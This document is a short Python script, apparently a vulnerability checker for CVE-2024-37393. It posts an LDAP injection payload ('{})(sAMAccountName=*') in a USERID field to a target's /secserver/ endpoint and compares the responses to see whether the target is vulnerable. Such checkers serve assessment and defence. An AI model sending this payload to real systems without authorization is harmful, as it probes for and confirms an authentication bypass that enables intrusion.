#!/usr/bin/python3
import random
import string
import logging
import requests
import argparse

logging.basicConfig(level=logging.INFO)

QUERY_CHECK_INJECTION = """FLAG=DESKTOP\r
1\r
STATUS:INIT\r
USERID:{})(sAMAccountName=*\r
MEMBEROF:Domain Users
"""

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='cve-2024-37393-checker')
    parser.add_argument("-u", "--url", help="http(s)://target.com", required=True)
    args = parser.parse_args()

    res = requests.post("{}/secserver/?".format(args.url), data="FLAG=DESKTOP")
    version = res.content.split(b"\r\n")[0].decode("ascii")
    logging.info("CVE-2024-37393 checker script - OPTISTREAM.IO")
    logging.info(f"Identified version: {version}")

    logging.info("Checking LDAP injection...")

    random_cn = ''.join(random.choices(string.ascii_lowercase, k=20))
    res1 = requests.post("{}/secserver/?".format(args.url), \
                         data=QUERY_CHECK_INJECTION.format(random_cn))
    res2 = requests.post("{}/secserver/?".format(args.url), \
                         data=QUERY_CHECK_INJECTION.format('*'))

    if "Error checking Group" in res1.content.decode("ascii") and \
        "GETPASSCODE" in res2.content.decode("ascii"):
        logging.warning("Target is vulnerable")
    else:
        logging.error("Not vulnerable")
